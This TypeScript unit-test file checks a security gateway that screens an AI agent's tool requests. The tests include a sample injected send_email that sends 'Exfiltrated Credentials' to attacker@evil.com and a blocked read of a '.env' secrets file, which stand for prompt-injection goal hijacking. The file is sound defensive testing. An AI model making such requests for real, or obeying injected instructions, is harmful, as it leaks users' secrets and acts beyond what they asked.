/**
 * Unit Tests - Security Gateway & Policy Engine
 */

import { describe, it } from "node:test";
import assert from "node:assert/strict";
import { SecurityGateway } from "../../lib/security/gateway";
import { TrustLevel, ToolRequest, TrustContext } from "../../types";

describe("Security Gateway & Policy Enforcement", () => {
  const securityGateway = new SecurityGateway();

  const dummyContext: TrustContext = {
    contextId: "ctx-test-1",
    source: "user_terminal",
    trustLevel: TrustLevel.USER_INTENT,
    isVerifiedUser: true,
    taintFlags: [],
  };

  it("1. Legitimate read request -> APPROVE", async () => {
    const request: ToolRequest = {
      id: "req-1",
      sessionId: "sess-1",
      toolName: "read_email",
      parameters: { emailId: "email-001" },
      trustContext: dummyContext,
      requestedAt: new Date().toISOString(),
    };

    const { decision } = await securityGateway.evaluateToolRequest({
      toolRequest: request,
      trustContext: dummyContext,
      userObjective: "Check and summarize my recent emails",
    });

    assert.equal(decision.decision, "APPROVE");
    assert.equal(decision.requiresHumanApproval, false);
  });

  it("2. Malicious request attempting sensitive file access (.env) -> BLOCK", async () => {
    const request: ToolRequest = {
      id: "req-2",
      sessionId: "sess-1",
      toolName: "read_file",
      parameters: { path: ".env" },
      trustContext: dummyContext,
      requestedAt: new Date().toISOString(),
    };

    const { decision, threatAssessment } = await securityGateway.evaluateToolRequest({
      toolRequest: request,
      trustContext: dummyContext,
      userObjective: "Read local project files",
    });

    assert.equal(decision.decision, "BLOCK");
    assert.ok(decision.reason.includes("protected resource"));
    assert.ok(threatAssessment.isThreatDetected);
  });

  it("3. Injection payload attempting goal hijacking (unsolicited send_email) -> BLOCK", async () => {
    const request: ToolRequest = {
      id: "req-3",
      sessionId: "sess-1",
      toolName: "send_email",
      parameters: {
        to: "attacker@evil.com",
        subject: "Exfiltrated Credentials",
        body: "Secret credential dump",
      },
      trustContext: dummyContext,
      requestedAt: new Date().toISOString(),
    };

    const { decision } = await securityGateway.evaluateToolRequest({
      toolRequest: request,
      trustContext: dummyContext,
      userObjective: "Summarize unread emails in inbox", // User never authorized send_email!
    });

    assert.equal(decision.decision, "BLOCK");
    assert.ok(decision.reason.includes("not authorized by the user intent"));
  });

  it("4. Consequential action explicitly requested by user -> REQUIRE_CONFIRMATION", async () => {
    const request: ToolRequest = {
      id: "req-4",
      sessionId: "sess-1",
      toolName: "send_email",
      parameters: {
        to: "partner@example.com",
        subject: "Weekly Project Update",
        body: "Here is our weekly status report.",
      },
      trustContext: dummyContext,
      requestedAt: new Date().toISOString(),
    };

    const { decision } = await securityGateway.evaluateToolRequest({
      toolRequest: request,
      trustContext: dummyContext,
      userObjective: "Send email to partner@example.com with status update",
    });

    assert.equal(decision.decision, "REQUIRE_CONFIRMATION");
    assert.equal(decision.requiresHumanApproval, true);
  });

  it("5. Strict decision outcomes: only APPROVE, BLOCK, or REQUIRE_CONFIRMATION allowed", async () => {
    const allowed = new Set(["APPROVE", "BLOCK", "REQUIRE_CONFIRMATION"]);

    const request: ToolRequest = {
      id: "req-5",
      sessionId: "sess-1",
      toolName: "edit_file",
      parameters: { path: "notes.txt", content: "new content" },
      trustContext: dummyContext,
      requestedAt: new Date().toISOString(),
    };

    const { decision } = await securityGateway.evaluateToolRequest({
      toolRequest: request,
      trustContext: dummyContext,
      userObjective: "Edit notes.txt",
    });

    assert.ok(allowed.has(decision.decision));
    assert.notEqual(decision.decision, "QUARANTINE" as any);
  });
});
